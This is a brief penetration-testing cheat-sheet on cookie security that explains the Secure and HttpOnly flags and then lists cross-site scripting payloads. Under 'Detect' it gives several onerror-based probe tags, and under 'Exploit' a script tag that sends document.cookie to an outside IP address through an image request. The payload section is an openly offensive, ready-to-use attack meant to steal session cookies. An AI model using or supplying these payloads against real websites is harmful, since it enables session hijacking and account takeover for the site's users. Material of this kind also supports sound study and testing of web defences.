The **Secure** flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in cleartext and captured over the network.

The **HttpOnly** flag instructs the browser to deny JavaScript access to the cookie. If this flag is
not set, we can use an XSS payload to steal the cookie.

### Payloads

## Detect
```javascript
< > ' " { } ;
<audio src/onerror=alert('################INJECT##############')>
<image/src/onerror=prompt('################INJECT##############')>
<img src =q onerror=alert('################INJECT##############')>
```

## Exploit
```javascript
<script>new Image().src="http://10.11.0.4/agh.css output="+document.cookie</script>
```